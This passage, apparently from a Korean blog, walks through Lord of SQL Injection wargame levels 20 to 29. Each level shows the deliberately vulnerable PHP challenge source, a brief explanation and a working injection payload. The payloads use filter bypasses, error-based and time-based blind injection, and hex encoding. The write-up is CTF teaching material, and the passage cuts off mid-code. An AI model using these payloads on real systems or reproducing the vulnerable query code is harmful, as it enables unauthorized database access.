있습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : pw&#x3D;&#39;||id&#x3D;&quot;admin&quot; and instr(pw,&quot;BRUTE_HERE&quot;)#</span><br></pre></td></tr></table></figure><h3 id="20-dragon"><a href="#20-dragon" class="headerlink" title="20. dragon"></a>20. dragon</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  $db = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>); </span><br><span class="line">  $query = <span class="string">"select id from prob_dragon where id='guest'# and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>; </span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>; </span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">'admin'</span>) solve(<span class="string">"dragon"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>id 조건식 뒷 부분이 주석처리 되어 있는데 개행문자를 삽입하면 주석에서 탈출할 수 있습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : pw&#x3D;%0a &amp;&amp; 0||id&#x3D;&quot;admin&quot;#</span><br></pre></td></tr></table></figure><h3 id="21-iron-golem"><a href="#21-iron-golem" class="headerlink" title="21. iron_golem"></a>21. iron_golem</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  $db = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/sleep|benchmark/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_iron_golem where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query));</span><br><span class="line">  <span class="keyword">if</span>(mysqli_error($db)) <span class="keyword">exit</span>(mysqli_error($db));</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  </span><br><span class="line">  $_GET[pw] = addslashes($_GET[pw]);</span><br><span class="line">  $query = <span class="string">"select pw from prob_iron_golem where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query));</span><br><span class="line">  <span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"iron_golem"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>오류코드을 출력해 주는 Error based 문제입니다. updatexml 을 시도해 보았지만 pw 컬럼의 값이 utf32 자료형으로 되어있어 바로 확인 할 수는 없었습니다.<br>하지만 if 을 이용해 런타임에서 오류를 발생시키는 3e200 * 3e200 연산식을 삽입하면 blind injection 이 가능합니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : pw&#x3D;&#39;||if(ord(mid(pw,1,1))&gt;50000,1,3e200*3e200)#</span><br></pre></td></tr></table></figure><h3 id="22-dark-eyes"><a href="#22-dark-eyes" class="headerlink" title="22. dark_eyes"></a>22. dark_eyes</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  $db = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/col|if|case|when|sleep|benchmark/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_dark_eyes where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query));</span><br><span class="line">  <span class="keyword">if</span>(mysqli_error($db)) <span class="keyword">exit</span>();</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  </span><br><span class="line">  $_GET[pw] = addslashes($_GET[pw]);</span><br><span class="line">  $query = <span class="string">"select pw from prob_dark_eyes where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query));</span><br><span class="line">  <span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"dark_eyes"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>이전 문제와 비슷하지만, if, case, when 등이 필터링 되므로 if문이 아닌 다른 방법을 사용해야만 합니다. exp 함수에 710 이상의 인자를 주면 double value out of range 오류가 발생한다는 것을 이용하여 exp(710*(조건식)) 의 형태로 Error based blind injection을 시도할 수 있습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : pw&#x3D;&#39;||exp(710*(ord(substr((pw),1,1))&gt;&#x3D;40))#</span><br></pre></td></tr></table></figure><h3 id="23-hell-fire"><a href="#23-hell-fire" class="headerlink" title="23. hell_fire"></a>23. hell_fire</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  $db = dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|proc|union/i'</span>, $_GET[order])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  $query = <span class="string">"select id,email,score from prob_hell_fire where 1 order by &#123;$_GET[order]&#125;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;table border=1&gt;&lt;tr&gt;&lt;th&gt;id&lt;/th&gt;&lt;th&gt;email&lt;/th&gt;&lt;th&gt;score&lt;/th&gt;"</span>;</span><br><span class="line">  $rows = mysqli_query($db,$query);</span><br><span class="line">  <span class="keyword">while</span>(($result = mysqli_fetch_array($rows)))&#123;</span><br><span class="line">    <span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">"admin"</span>) $result[<span class="string">'email'</span>] = <span class="string">"**************"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;&lt;td&gt;&#123;$result[id]&#125;&lt;/td&gt;&lt;td&gt;&#123;$result[email]&#125;&lt;/td&gt;&lt;td&gt;&#123;$result[score]&#125;&lt;/td&gt;&lt;/tr&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;/table&gt;&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;"</span>;</span><br><span class="line"></span><br><span class="line">  $_GET[email] = addslashes($_GET[email]);</span><br><span class="line">  $query = <span class="string">"select email from prob_hell_fire where id='admin' and email='&#123;$_GET[email]&#125;'"</span>;</span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query));</span><br><span class="line">  <span class="keyword">if</span>(($result[<span class="string">'email'</span>]) &amp;&amp; ($result[<span class="string">'email'</span>] === $_GET[<span class="string">'email'</span>])) solve(<span class="string">"hell_fire"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>이전 문제와 동일한 방식으로 해결할 수 있습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : order&#x3D;exp(710*(ord(substr((email),1,1))&gt;&#x3D;5000))</span><br></pre></td></tr></table></figure><h3 id="24-evil-wizard"><a href="#24-evil-wizard" class="headerlink" title="24. evil_wizard"></a>24. evil_wizard</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  $db = dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|proc|union|sleep|benchmark/i'</span>, $_GET[order])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  $query = <span class="string">"select id,email,score from prob_evil_wizard where 1 order by &#123;$_GET[order]&#125;"</span>; <span class="comment">// same with hell_fire? really?</span></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;table border=1&gt;&lt;tr&gt;&lt;th&gt;id&lt;/th&gt;&lt;th&gt;email&lt;/th&gt;&lt;th&gt;score&lt;/th&gt;"</span>;</span><br><span class="line">  $rows = mysqli_query($db,$query);</span><br><span class="line">  <span class="keyword">while</span>(($result = mysqli_fetch_array($rows)))&#123;</span><br><span class="line">    <span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">"admin"</span>) $result[<span class="string">'email'</span>] = <span class="string">"**************"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;&lt;td&gt;&#123;$result[id]&#125;&lt;/td&gt;&lt;td&gt;&#123;$result[email]&#125;&lt;/td&gt;&lt;td&gt;&#123;$result[score]&#125;&lt;/td&gt;&lt;/tr&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;/table&gt;&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;"</span>;</span><br><span class="line"></span><br><span class="line">  $_GET[email] = addslashes($_GET[email]);</span><br><span class="line">  $query = <span class="string">"select email from prob_evil_wizard where id='admin' and email='&#123;$_GET[email]&#125;'"</span>;</span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query));</span><br><span class="line">  <span class="keyword">if</span>(($result[<span class="string">'email'</span>]) &amp;&amp; ($result[<span class="string">'email'</span>] === $_GET[<span class="string">'email'</span>])) solve(<span class="string">"evil_wizard"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>이전 문제와 동일하게 오류를 발생시키는 연산식으로 Blind injection을 수행할 수 있습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : order&#x3D;if(email like &quot;%&quot;,3e300*3e300,1)</span><br></pre></td></tr></table></figure><h3 id="25-green-dragon"><a href="#25-green-dragon" class="headerlink" title="25. green_dragon"></a>25. green_dragon</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  $db = dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\'|\"/i'</span>, $_GET[id])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\'|\"/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  $query = <span class="string">"select id,pw from prob_green_dragon where id='&#123;$_GET[id]&#125;' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\'|\"/i'</span>, $result[<span class="string">'id'</span>])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\'|\"/i'</span>, $result[<span class="string">'pw'</span>])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">    $query2 = <span class="string">"select id from prob_green_dragon where id='&#123;$result[id]&#125;' and pw='&#123;$result[pw]&#125;'"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query2 : &lt;strong&gt;&#123;$query2&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">    $result = mysqli_fetch_array(mysqli_query($db,$query2));</span><br><span class="line">    <span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">"admin"</span>) solve(<span class="string">"green_dragon"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>쿼리의 결과값을 사용해 또 다른 쿼리를 실행하는 이중 쿼리 문제입니다.<br>입력값과 결과값 모두에서 쿼트를 필터링 하는데, hex 인코딩을 사용하면 우회할 수 있습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : id&#x3D;\&amp;pw&#x3D;union select 0x5c,0x756e696f6e2073656c6563742030783631363436643639366523#</span><br></pre></td></tr></table></figure><h3 id="26-red-dragon"><a href="#26-red-dragon" class="headerlink" title="26. red_dragon"></a>26. red_dragon</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  $db = dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\./i'</span>, $_GET[<span class="string">'id'</span>])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(strlen($_GET[<span class="string">'id'</span>]) &gt; <span class="number">7</span>) <span class="keyword">exit</span>(<span class="string">"too long string"</span>);</span><br><span class="line">  $no = is_numeric($_GET[<span class="string">'no'</span>]) ? $_GET[<span class="string">'no'</span>] : <span class="number">1</span>;</span><br><span class="line">  $query = <span class="string">"select id from prob_red_dragon where id='&#123;$_GET['id']&#125;' and no=&#123;$no&#125;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result['id']&#125;&lt;/h2&gt;"</span>;</span><br><span class="line"></span><br><span class="line">  $query = <span class="string">"select no from prob_red_dragon where id='admin'"</span>; <span class="comment">// if you think challenge got wrong, look column name again.</span></span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'no'</span>] === $_GET[<span class="string">'no'</span>]) solve(<span class="string">"red_dragon"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>본 문항은 본래 비교연산자와 no 부분에 16진수 인코딩된 문자열을 삽입하여 pw 컬럼을 알아내는 문제였는데 php 버전을 업데이트 하면서 is_numeric 함수가 hex값에 대해 false를 반환하도록 변경되어 no값을 알아내는 문제로 변경되었습니다.</p><p>php의 is_numeric 함수는 숫자의 앞 부분에 %09, %20, %0a, %0b, %0c, %0d 가 오는 것을 허용합니다. 따라서 id 파라미터에 끝에 #을 삽입하여 뒷 부분을 주석처리해 주고 no 파라미터의 앞 부분에 개행문자를 삽입해 주면 비교식을 통해 no값을 알아낼 수 있습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : id&#x3D;&#39;||no&gt;#&amp;no&#x3D;%0a1000000</span><br></pre></td></tr></table></figure><h3 id="27-blue-dragon"><a href="#27-blue-dragon" class="headerlink" title="27. blue_dragon"></a>27. blue_dragon</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  $db = dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\./i'</span>, $_GET[id])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\./i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_blue_dragon where id='&#123;$_GET[id]&#125;' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query));</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'|\\\/i'</span>, $_GET[id])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'|\\\/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line"></span><br><span class="line">  $_GET[pw] = addslashes($_GET[pw]);</span><br><span class="line">  $query = <span class="string">"select pw from prob_blue_dragon where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query));</span><br><span class="line">  <span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"blue_dragon"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>쿼리 수행을 먼저 한 후에 필터링을 하는 조금 특이한 구성을 하고 있습니다. 결과값도 확인이 불가능하지만, Time based를 사용하면 필터링에 구애받지 않고 pw를 알아낼 수 있습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : id&#x3D;&amp;pw&#x3D;&#39;||id&#x3D;&quot;admin&quot; and if(pw like &#39;%&#39;,sleep(1),0)#</span><br></pre></td></tr></table></figure><h3 id="28-frankenstein"><a href="#28-frankenstein" class="headerlink" title="28. frankenstein"></a>28. frankenstein</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  $db = dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(|\)|union/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  $query = <span class="string">"select id,pw from prob_frankenstein where id='frankenstein' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query));</span><br><span class="line">  <span class="keyword">if</span>(mysqli_error($db)) <span class="keyword">exit</span>(<span class="string">"error"</span>);</span><br><span class="line"></span><br><span class="line">  $_GET[pw] = addslashes($_GET[pw]);</span><br><span class="line">  $query = <span class="string">"select pw from prob_frankenstein where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query));</span><br><span class="line">  <span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"frankenstein"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Error based 문제인데 괄호가 필터링 되어 있습니다.<br>하지만 case when .. then .. else .. end 구문을 이용하면 괄호없이 Blind injection이 가능합니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : pw&#x3D;&#39;||id&#x3D;&#39;admin&#39; and case when pw like &#39;%&#39; then 3e300*3e300 else 1 end#</span><br></pre></td></tr></table></figure><h3 id="29-phantom"><a href="#29-phantom" class="headerlink" title="29. phantom"></a>29. phantom</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  $db = dbconnect(<span class="string">"phantom"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>($_GET[<span class="string">'joinmail'</span>])&#123;</span><br><span class="line">    $query = <span class="string">"insert into prob_phantom values(0,'&#123;$_SERVER[REMOTE_ADDR]&#125;','&#123;$_GET[joinmail]&#125;')"</span>;</span><br><span class="line">    mysqli_query($db,$query);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $rows = mysqli_query($db,<span class="string">"select no,ip,email from prob_phantom where no=1 or ip='&#123;$_SERVER[REMOTE_ADDR]&#125;'"</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;table border=1&gt;&lt;tr&gt;&lt;th&gt;ip&lt;/th&gt;&lt;th&gt;email&lt;/th&gt;&lt;/tr&gt;"</span>;</span><br><span class="line">    <span class="keyword">while</span>(($result = mysqli_fetch_array($rows)))&#123;</span><br><span class="line">    <span class="keyword">if</span>($result[<span class="string">'no'</span>] == <span class="number">1</span>) $result[<span class="string">'email'</span>] = <span class="string">"**************"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;&lt;td&gt;&#123;$result[ip]&#125;&lt;/td&gt;&lt;td&gt;&#123;$result[email]&#125;&lt;/td&gt;&lt;/tr&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;/table&gt;"</span>;</span><br><span class="line"></span><br><span class="line">  $_GET[email] = addslashes($_GET[email]);</span><br><span class="line">  $query = <span class="string">"select email from prob_phantom where no=1 and email='&#123;$_GET[email]&#125;'"</span>;</span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query));</span><br><span class="line">  <span class="keyword">if</span>(($result[<span class="string">'email'</span>]) &amp;&amp; ($result[<span 